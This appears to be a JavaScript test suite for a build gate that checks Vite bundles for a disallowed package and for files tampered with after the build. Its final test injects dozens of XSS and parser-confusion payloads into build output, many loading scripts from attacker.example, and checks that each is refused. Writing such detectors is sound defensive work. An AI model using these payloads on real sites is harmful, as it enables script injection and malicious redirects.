function addWorkers(dir, workers) {
  const entry = join(dir, "src", "main.js");
  const imports = [];
  workers.forEach(({ file, imports: deps, inline }, index) => {
    const lines = deps.map((dep, i) => `import * as w${i} from ${JSON.stringify(dep)};`);
    lines.push(`self.onmessage = () => self.postMessage([${deps.map((_, i) => `typeof w${i}`).join(", ")}].join(" "));`);
    mkdirSync(join(dir, "src", ...file.split("/").slice(0, -1)), { recursive: true });
    writeFileSync(join(dir, "src", file), `${lines.join("\n")}\n`);
    imports.push(`import W${index} from "./${file}?worker${inline ? "&inline" : ""}";\nnew W${index}().postMessage(1);`);
  });
  writeFileSync(entry, `${imports.join("\n")}\n${readFileSync(entry, "utf8")}`);
}

const run = (argv, lines) => main(argv, { log: (line) => lines.push(line), error: (line) => lines.push(line) });
const argvFor = (dir, app, ...extra) => ["--out", join(dir, "out"), "--project", app, "--allowlist", join(dir, "allow.json"), "--now", "2026-11-18T12:00:00Z", ...extra];

test("a real Vite build that bundles only unrelated packages passes, reporting the pinned public copy and inline script", async () => {
  const { entry, nodeModules } = viteProject();
  const dir = mkdtempSync(join(tmpdir(), "bundle-check-real-"));
  try {
    const app = join(dir, "app");
    miniProject(app, nodeModules, ["react"]);
    writeFileSync(join(dir, "allow.json"), JSON.stringify(ALLOW_DOC));
    const lines = [];
    await run(argvFor(dir, app), lines);
    const summary = lines.join("\n");
    assert.match(summary, /PASS; no shipped script resolves code from: picomatch/);
    assert.match(summary, /1 pinned public copy: embed\.js/);
    assert.match(summary, /1 document\(s\) with 1 inline script\(s\) \(1 pinned by sha256, 0 by pattern\) and 0 data block\(s\)/);
    assert.match(summary, /from 0 worker build\(s\)/);
    const vite = await import(pathToFileURL(entry).href);
    const record = await buildGraph({ projectDir: app, outDir: join(dir, "out2"), vite });
    const judged = evaluateGraph({ chunks: record.chunks, assets: record.assets, allow, firstPartyRoot: app, trustedVirtual: trust.virtual });
    assert.ok(judged.packages.has("react"), [...judged.packages].join(", "));
    assert.ok(!judged.packages.has("picomatch"));
    assert.ok(judged.firstParty >= 1);
    assert.equal(record.config.publicDir, join(app, "public"));
    for (const [fileName, digest] of record.hashes) assert.equal(sha256(readFileSync(join(dir, "out2", fileName))), digest, fileName);
  } finally {
    rmSync(dir, { recursive: true, force: true });
  }
});

test("a real Vite build whose application source imports picomatch FAILS the gate", async () => {
  const { nodeModules } = viteProject();
  const dir = mkdtempSync(join(tmpdir(), "bundle-check-real-"));
  try {
    const app = join(dir, "app");
    miniProject(app, nodeModules, ["react", "picomatch"], { publicScript: false });
    writeFileSync(join(dir, "allow.json"), JSON.stringify(ALLOW_DOC));
    const lines = [];
    await rejectsGate(run(argvFor(dir, app), lines), /allowlist premise/);
    assert.ok(lines.some((line) => /VIOLATION picomatch is bundled into /.test(line)), lines.join("\n"));
  } finally {
    rmSync(dir, { recursive: true, force: true });
  }
});

test("a real npm-alias install (picomatch under node_modules/matcher) is attributed to picomatch and FAILS the gate", async () => {
  const { nodeModules } = viteProject();
  const dir = mkdtempSync(join(tmpdir(), "bundle-check-real-"));
  try {
    const app = join(dir, "app");
    miniProject(app, nodeModules, ["react", "matcher"], { publicScript: false, farm: true });
    cpSync(realpathSync(join(nodeModules, "picomatch")), join(app, "node_modules", "matcher"), { recursive: true });
    assert.equal(JSON.parse(readFileSync(join(app, "node_modules", "matcher", "package.json"), "utf8")).name, "picomatch");
    // npm's hidden lockfile records the alias as it would after `npm install matcher@npm:picomatch`.
    writeFileSync(join(app, "node_modules", ".package-lock.json"), JSON.stringify({ lockfileVersion: 3, packages: { "node_modules/matcher": { name: "picomatch", version: "4.0.7" } } }));
    writeFileSync(join(dir, "allow.json"), JSON.stringify(ALLOW_DOC));
    const lines = [];
    await rejectsGate(run(argvFor(dir, app), lines), /allowlist premise/);
    assert.ok(lines.some((line) => /VIOLATION picomatch is bundled into .* \(installed as matcher\)/.test(line)), lines.join("\n"));
    // The same alias with a nameless manifest (Vite still resolves it through "main"): without a lockfile the
    // install has no identity and the gate fails closed; once npm's lockfile records the alias, the lockfile
    // names it picomatch and the violation is reported. (A second project: manifest names are cached per directory.)
    const app2 = join(dir, "app2");
    miniProject(app2, nodeModules, ["react", "matcher"], { publicScript: false, farm: true });
    cpSync(realpathSync(join(nodeModules, "picomatch")), join(app2, "node_modules", "matcher"), { recursive: true });
    writeFileSync(join(app2, "node_modules", "matcher", "package.json"), JSON.stringify({ main: "index.js", private: true }));
    await rejectsGate(run(argvFor(dir, app2), []), /no valid lockfile .* records the installation/);
    writeFileSync(join(app2, "node_modules", ".package-lock.json"), JSON.stringify({ lockfileVersion: 3, packages: { "node_modules/matcher": { name: "picomatch", version: "4.0.7" } } }));
    const lines2 = [];
    await rejectsGate(run(argvFor(dir, app2), lines2), /allowlist premise/);
    assert.ok(lines2.some((line) => /VIOLATION picomatch is bundled into .* \(installed as matcher\)/.test(line)), lines2.join("\n"));
  } finally {
    rmSync(dir, { recursive: true, force: true });
  }
});

test("a real install whose nested package.json is named differently (picomatch/lib) is still attributed to picomatch and FAILS the gate", async () => {
  const { nodeModules } = viteProject();
  const dir = mkdtempSync(join(tmpdir(), "bundle-check-real-"));
  try {
    const app = join(dir, "app");
    miniProject(app, nodeModules, ["react", "picomatch/lib/scan.js"], { publicScript: false, farm: true });
    // A private copy of the installed picomatch whose lib/ carries its own, differently named manifest.
    rmSync(join(app, "node_modules", "picomatch"));
    cpSync(realpathSync(join(nodeModules, "picomatch")), join(app, "node_modules", "picomatch"), { recursive: true });
    writeFileSync(join(app, "node_modules", "picomatch", "lib", "package.json"), JSON.stringify({ name: "matcher-internal", private: true }));
    writeFileSync(join(app, "node_modules", ".package-lock.json"), JSON.stringify({ lockfileVersion: 3, packages: { "node_modules/picomatch": { version: "4.0.7" } } }));
    writeFileSync(join(dir, "allow.json"), JSON.stringify(ALLOW_DOC));
    const lines = [];
    await rejectsGate(run(argvFor(dir, app), lines), /allowlist premise/);
    // The deep CommonJS import is recorded through Vite's commonjs proxy ids (a NUL prefix and a ?commonjs-… query);
    // the directory label equals the package name here, so no "(installed as …)" suffix follows.
    assert.ok(lines.some((line) => /VIOLATION picomatch is bundled into .*node_modules\/picomatch\/lib\/scan\.js(?:\?[\w-]+)?$/.test(line)), lines.join("\n"));
  } finally {
    rmSync(dir, { recursive: true, force: true });
  }
});

test("a real nested install (devtool/node_modules/matcher holding a nameless picomatch) is named by the lockfile and FAILS the gate", async () => {
  const { nodeModules } = viteProject();
  const dir = mkdtempSync(join(tmpdir(), "bundle-check-real-"));
  try {
    const app = join(dir, "app");
    miniProject(app, nodeModules, ["react", "devtool"], { publicScript: false, farm: true });
    // devtool is an ESM package whose own nested dependency "matcher" is picomatch installed under an alias with a
    // nameless manifest; npm's hidden lockfile records both installations, the alias with its real name.
    const devtool = join(app, "node_modules", "devtool");
    mkdirSync(join(devtool, "node_modules"), { recursive: true });
    writeFileSync(join(devtool, "package.json"), JSON.stringify({ name: "devtool", version: "1.0.0", type: "module", main: "index.js" }));
    writeFileSync(join(devtool, "index.js"), 'import * as m from "matcher";\nexport default m;\n');
    cpSync(realpathSync(join(nodeModules, "picomatch")), join(devtool, "node_modules", "matcher"), { recursive: true });
    writeFileSync(join(devtool, "node_modules", "matcher", "package.json"), JSON.stringify({ main: "index.js", private: true }));
    writeFileSync(join(app, "node_modules", ".package-lock.json"), JSON.stringify({ lockfileVersion: 3, packages: {
      "node_modules/devtool": { version: "1.0.0" },
      "node_modules/devtool/node_modules/matcher": { name: "picomatch", version: "4.0.7" },
    } }));
    writeFileSync(join(dir, "allow.json"), JSON.stringify(ALLOW_DOC));
    const lines = [];
    await rejectsGate(run(argvFor(dir, app), lines), /allowlist premise/);
    assert.ok(lines.some((line) => /VIOLATION picomatch is bundled into .*devtool\/node_modules\/matcher\/.* \(installed as matcher\)/.test(line)), lines.join("\n"));
    /** The same nested install in another project directory (lockfiles and manifests are cached per directory). */
    const nested = (target) => {
      miniProject(target, nodeModules, ["react", "devtool"], { publicScript: false, farm: true });
      const dt = join(target, "node_modules", "devtool");
      mkdirSync(join(dt, "node_modules"), { recursive: true });
      writeFileSync(join(dt, "package.json"), JSON.stringify({ name: "devtool", version: "1.0.0", type: "module", main: "index.js" }));
      writeFileSync(join(dt, "index.js"), 'import * as m from "matcher";\nexport default m;\n');
      cpSync(realpathSync(join(nodeModules, "picomatch")), join(dt, "node_modules", "matcher"), { recursive: true });
      writeFileSync(join(dt, "node_modules", "matcher", "package.json"), JSON.stringify({ main: "index.js", private: true }));
    };
    // A malformed hidden lockfile (array `packages`) cannot hide the alias the regular lockfile records.
    const appB = join(dir, "appB");
    nested(appB);
    writeFileSync(join(appB, "node_modules", ".package-lock.json"), JSON.stringify({ lockfileVersion: 3, packages: [] }));
    writeFileSync(join(appB, "package-lock.json"), JSON.stringify({ lockfileVersion: 3, packages: { "node_modules/devtool": { version: "1.0.0" }, "node_modules/devtool/node_modules/matcher": { name: "picomatch", version: "4.0.7" } } }));
    const linesB = [];
    await rejectsGate(run(argvFor(dir, appB), linesB), /allowlist premise/);
    assert.ok(linesB.some((line) => /VIOLATION picomatch is bundled into .* \(installed as matcher\)/.test(line)), linesB.join("\n"));
    // A hidden lockfile that omits the nested alias, and no regular lockfile: the nameless manifest is no
    // identity, so the gate fails closed instead of attributing the code to devtool.
    const appC = join(dir, "appC");
    nested(appC);
    writeFileSync(join(appC, "node_modules", ".package-lock.json"), JSON.stringify({ lockfileVersion: 3, packages: { "node_modules/devtool": { version: "1.0.0" } } }));
    await rejectsGate(run(argvFor(dir, appC), []), /package\.json has no readable name/);
  } finally {
    rmSync(dir, { recursive: true, force: true });
  }
});

test("inline workers: one importing picomatch FAILS; two same-named worker builds are both judged; a file worker is opaque", async () => {
  const { nodeModules } = viteProject();
  const dir = mkdtempSync(join(tmpdir(), "bundle-check-real-"));
  try {
    writeFileSync(join(dir, "allow.json"), JSON.stringify(ALLOW_DOC));
    const inlineApp = join(dir, "inline");
    miniProject(inlineApp, nodeModules, ["react"], { publicScript: false });
    addWorkers(inlineApp, [{ file: "worker.js", imports: ["picomatch"], inline: true }]);
    const lines = [];
    await rejectsGate(run(argvFor(dir, inlineApp), lines), /allowlist premise/);
    assert.ok(lines.some((line) => new RegExp(`VIOLATION picomatch is bundled into ${WORKER_PREFIX}1:`).test(line)), lines.join("\n"));
    // Two sub-builds emitting the same file name, in both import orders: neither record may hide the other.
    const sameName = 'export default { worker: { rollupOptions: { output: { entryFileNames: "[name].js" } } } };\n';
    for (const [first, second] of [[["picomatch"], ["react"]], [["react"], ["picomatch"]]]) {
      const app = join(dir, `pair-${first[0]}`);
      miniProject(app, nodeModules, ["react"], { publicScript: false, config: sameName });
      addWorkers(app, [{ file: "a/worker.js", imports: first, inline: true }, { file: "b/worker.js", imports: second, inline: true }]);
      const out = [];
      await rejectsGate(run(argvFor(dir, app), out), /allowlist premise/);
      assert.ok(out.some((line) => /VIOLATION picomatch is bundled into worker[12]:worker\.js/.test(line)), out.join("\n"));
      assert.ok(out.some((line) => /from 2 worker build\(s\)/.test(line)), out.join("\n"));
    }
    const fileApp = join(dir, "file");
    miniProject(fileApp, nodeModules, ["react"], { publicScript: false });
    addWorkers(fileApp, [{ file: "worker.js", imports: ["react"], inline: false }]);
    await rejectsGate(run(argvFor(dir, fileApp), []), /opaque executable/);
  } finally {
    rmSync(dir, { recursive: true, force: true });
  }
});

test("the deployment build's output must equal this build's chunks and pins (--verify-dist); every mutation of it is refused", async () => {
  const { nodeModules } = viteProject();
  const dir = mkdtempSync(join(tmpdir(), "bundle-check-real-"));
  try {
    const app = join(dir, "app");
    miniProject(app, nodeModules, ["react"]);
    writeFileSync(join(dir, "allow.json"), JSON.stringify(ALLOW_DOC));
    const dist = join(dir, "dist");
    const argv = (...extra) => argvFor(dir, app, ...extra);
    await run(argv(), []);
    cpSync(join(dir, "out"), dist, { recursive: true }); // the deployment build: identical by construction here
    const lines = [];
    await run(argv("--verify-dist", dist), lines);
    assert.match(lines.join("\n"), /deployment build .*: .* every script byte-identical to this build's chunks or pinned/);
    await rejectsGate(run(argv("--verify-dist", join(dir, "nope")), []), /does not exist/);
    // A hand-authored SVG asset with <title>, <desc>, a CSS <style> and comments (as the docs site ships) is accepted.
    writeFileSync(join(dist, "atlas.svg"), '<?xml version="1.0" encoding="UTF-8"?>\n<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 10 10" role="img" aria-labelledby="t d">\n  <title id="t">Atlas</title>\n  <desc id="d">A map</desc>\n  <style>\n    /* entrance animation */\n    @media (prefers-reduced-motion: no-preference) { .a { animation: f 1s both; } @keyframes f { from { opacity: 0; } to { opacity: 1; } } }\n  </style>\n  <!-- legend -->\n  <path class="a" d="M0 0h1"/>\n</svg>\n');
    await run(argv("--verify-dist", dist), []);
    rmSync(join(dist, "atlas.svg"));
    const chunk = walkOutput(dist).find((rel) => /^assets\/.*\.js$/.test(rel));
    const html = readFileSync(join(dist, "index.html"), "utf8");
    const originalChunk = readFileSync(join(dist, chunk));
    /** Apply one mutation to dist, assert the gate refuses it with `pattern`, then undo it. */
    const refused = async (apply, pattern) => {
      apply();
      await rejectsGate(run(argv("--verify-dist", dist), []), pattern);
      writeFileSync(join(dist, chunk), originalChunk);
      writeFileSync(join(dist, "index.html"), html);
      writeFileSync(join(dist, "embed.js"), EMBED);
      for (const extra of ["extra.js", "matcher.txt", "payload", "module.wasm", "evil.svg", "feed.xml", "payload.xhtml", "payload.pdf"]) rmSync(join(dist, extra), { force: true });
    };
    const inHtml = (snippet) => () => writeFileSync(join(dist, "index.html"), html.replace("</body>", `${snippet}</body>`));
    await refused(() => writeFileSync(join(dist, chunk), Buffer.concat([originalChunk, Buffer.from("\n/* appended */\n")])), /rewritten after the build/);
    await refused(() => writeFileSync(join(dist, "extra.js"), "console.log('extra')"), /extra\.js is a script that is not a chunk of this build and not pinned/);
    await refused(() => writeFileSync(join(dist, "matcher.txt"), "picomatch compiled payload\n"), /matcher\.txt mentions allowlisted package picomatch/);
    await refused(() => writeFileSync(join(dist, "payload"), "opaque"), /payload is neither a chunk of this build nor of a recognised inert type/);
    await refused(() => writeFileSync(join(dist, "module.wasm"), "\0asm"), /module\.wasm is neither a chunk/);
    await refused(() => writeFileSync(join(dist, "evil.svg"), "<svg xmlns='http://www.w3.org/2000/svg'><script>x()</script></svg>"), /evil\.svg is an XML document carrying a <script>/);
    await refused(() => writeFileSync(join(dist, "feed.xml"), '<html xmlns="http://www.w3.org/1999/xhtml"><body><script src="https://attacker.example/matcher.js"></script></body></html>'), /feed\.xml is an XML document carrying a <script>/);
    await refused(() => writeFileSync(join(dist, "index.html"), html.replace(/<!doctype html>/i, '<!doctype html SYSTEM "><style>"><script src="https://attacker.example/p.js"></script></style>')), /unsupported declaration/);
    await refused(inHtml('<style ><script src="https://attacker.example/p.js"></script></style>'), /unsupported tag name/);
    await refused(inHtml('<svg><title><script src="https://attacker.example/p.js"></script></title></svg>'), /inside <svg> is an HTML integration point/);
    await refused(inHtml("<svg><style><script>globalThis.pwned=1</script></style></svg>"), /inline script 2 is not pinned/);
    await refused(inHtml("<select><style><script>globalThis.pwned=1</script></style></select>"), /<select> is refused/);
    await refused(inHtml("<script><!--<script>a</script>globalThis.pwned=1--></script>"), /script data escape sequence/);
    await refused(inHtml("<svg a=b/><style><script>globalThis.pwned=1</script></style></svg>"), /inline script 2 is not pinned/);
    await refused(inHtml('<svg><script language="vbscript">globalThis.pwned=1</script></svg>'), /inline script 2 is not pinned/);
    await refused(inHtml('<template><col><style></template><script src="https://attacker.example/matcher.js"></script></style>'), /<template> is refused/);
    await refused(inHtml('<svg><p><script/>import("https://attacker.example/matcher.js")</script></svg>'), /foreign-content breakout/);
    await refused(inHtml('<svg></p><script/>import("https://attacker.example/matcher.js")</script></svg>'), /foreign-content breakout/);
    await refused(inHtml("<svg / ><style><script>globalThis.pwned=1</script></style></svg>"), /cannot parse attributes/);
    await refused(() => writeFileSync(join(dist, "payload.xhtml"), '<html xmlns="http://www.w3.org/1999/xhtml"><body><style><script src="https://attacker.example/matcher.js"></script></style></body></html>'), /payload\.xhtml is an XML document carrying a <script>/);
    await refused(inHtml("<meta charset=iso-2022-jp>"), /declares the charset "iso-2022-jp"/);
    await refused(() => writeFileSync(join(dist, "index.html"), Buffer.concat([Buffer.from(html.replace("</body>", "<p>")), Buffer.from([0x1b]), Buffer.from("$B</p></body>")])), /control character U\+001B/);
    await refused(() => writeFileSync(join(dist, "evil.svg"), '<?xml version="1.0" encoding="ISO-2022-JP"?><svg xmlns="http://www.w3.org/2000/svg"/>'), /XML declaration encoding/);
    await refused(inHtml('<div><svg></div><script/>import("https://attacker.example/matcher.js")</script></svg>'), /misnested markup is refused/);
    await refused(inHtml(`<style>${"İ".repeat(12)}<!--</style><script src="https://attacker.example/p.js?-->"></script>`), /external script/);
    await refused(inHtml('<script type="speculationrules">{"prerender":[{"source":"list","urls":["/other-app/payload.html"]}]}</script>'), /speculation rules are refused/);
    await refused(inHtml('<meta http-equiv="refresh" content="0; url=&bsol;&bsol;attacker.example/payload.html">'), /URL .* contains whitespace, control characters or a backslash/);
    await refused(inHtml('<meta http-equiv="refresh" content="0; url=&Backslash;&Backslash;attacker.example/payload.html">'), /unsupported character reference &Backslash;/);
    await refused(inHtml(`<meta http-equiv="refresh" content="0; url='https://attacker.example'@document.invalid/">`), /text after its closing quote/);
    await refused(inHtml(`<meta http-equiv="refresh" content="0; url='https://attacker.example'">`), /outside this site/);
    await refused(() => writeFileSync(join(dist, "payload.xhtml"), '<html xmlns="http://www.w3.org/1999/xhtml"><head><meta http-equiv="refresh" content="0; url=https://attacker.example/payload.html"/></head><body/></html>'), /payload\.xhtml is an XML document with a <meta http-equiv="refresh">/);
    await refused(() => writeFileSync(join(dist, "feed.xml"), '<html xmlns="http://www.w3.org/1999/xhtml"><head><meta http-equiv="refresh" content="0; url=https://attacker.example/payload.html"/></head><body/></html>'), /feed\.xml is an XML document with a <meta http-equiv="refresh">/);
    await refused(() => writeFileSync(join(dist, "payload.pdf"), "%PDF-1.4\n1 0 obj << /OpenAction << /S /JavaScript /JS (app.alert(1)) >> >> endobj\n"), /payload\.pdf is neither a chunk of this build nor of a recognised inert type/);
    // A refresh to an XML target is judged through the target itself, which may carry no script.
    await refused(() => { writeFileSync(join(dist, "evil.svg"), "<svg xmlns='http://www.w3.org/2000/svg'><script>x()</script></svg>"); inHtml('<meta http-equiv="refresh" content="0; url=evil.svg">')(); }, /evil\.svg is an XML document carrying a <script>/);
    await refused(inHtml('<script language="">import("https://attacker.example/matcher.js")</script>'), /inline script 2 is not pinned/);
    await refused(() => writeFileSync(join(dist, "embed.js"), "/* replaced after the build */\n"), /embed\.js does not match its pin/);
    await refused(inHtml("<script>window.__late = 1</script>"), /inline script 2 is not pinned/);
    await refused(inHtml('<!-- <script src="/assets/known.js"> --><script src="https://cdn.example.invalid/picomatch.js"></script>'), /comment contains markup/);
    await refused(inHtml('<script src="https://cdn.example.invalid/x.js"></script>'), /external script/);
    await refused(inHtml('<iframe srcdoc="&lt;script src=&quot;https://cdn.example.invalid/x.js&quot;&gt;&lt;/script&gt;"></iframe>'), /refused/);
    await refused(inHtml('<div onclick="fetch(1)"></div>'), /inline event handler/);
    await refused(inHtml('<a href="&#106;avascript:fetch(1)">x</a>'), /executable URL scheme/);
    await refused(inHtml('<meta http-equiv="refresh" content="0; url=https://evil.example/">'), /outside this site/);
    await refused(inHtml('<link rel="modulepreload" href="https://cdn.example.invalid/x.js">'), /preloads an external script/);
    await refused(inHtml('<base href="https://cdn.example.invalid/">'), /<base> is refused/);
    await refused(inHtml(`<script src=" https://attacker.example/../..${chunk.startsWith("/") ? "" : "/"}${chunk}"></script>`), /external script/);
    await refused(inHtml('<script type="mod&#x75;le">import "https://attacker.example/p.js";</script>'), /inline script 2 is not pinned/);
    await refused(inHtml('<noscript><script type="application/json"></noscript><script>globalThis.pwned=1</script>'), /<noscript>: <script> without <\/script>/);
    await refused(inHtml('<noscript><meta http-equiv="refresh" content="0; url=https://attacker.example/payload.html"></noscript>'), /outside this site/);
    await refused(inHtml('<meta http-equiv="refresh" content="0; url=https://document.invalid/">'), /outside this site/);
    await refused(inHtml('<script src="//document.invalid/assets/x.js"></script>'), /external script/);
    await refused(inHtml(`<svg xml:base="https://attacker.example/" xmlns:xlink="http://www.w3.org/1999/xlink"><script xlink:href="/${chunk}"/></svg>`), /xml:base/);
    await refused(inHtml(`<script src="/${chunk}&nbsp;"></script>`), /percent-encoded local path/);
    await refused(inHtml(`<script src="/${chunk}&#127;"></script>`), /control characters/);
    await refused(inHtml('<svg><use href="/other-app/payload.svg#p"/></svg>'), /references another resource/);
    await refused(inHtml('<script! type="application/json"><script>globalThis.pwned=1</script>'), /unsupported tag name/);
    await refused(inHtml('<svg xmlns:xlink="http://www.w3.org/1999/xlink"><script xlink:href="https://attacker.example/p.js"></script></svg>'), /external script/);
    await refused(() => writeFileSync(join(dist, "evil.svg"), '<svg xmlns="http://www.w3.org/2000/svg"><a href="https://example.invalid/"><animate attributeName="href" values="https://example.invalid/;javascript:alert(1)" dur="1s" fill="freeze"/></a></svg>'), /SVG animation element/);
    // An untracked file dropped into public/ reaches the judged build and is refused there too.
    writeFileSync(join(app, "public", "loose.js"), "console.log('loose')\n");
    await rejectsGate(run(argv(), []), /loose\.js is a script that is not a chunk of this build and not pinned/);
  } finally {
    rmSync(dir, { recursive: true, force: true });
  }
});

test("a dir without Vite resolves nothing", () => {
  const dir = mkdtempSync(join(tmpdir(), "bundle-check-novite-"));
  try {
    writeFileSync(join(dir, "package.json"), "{}");
    throwsGate(() => resolveVite(dir), /vite is not installed/);
  } finally {
    rmSync(dir, { recursive: true, force: true });
  }
});
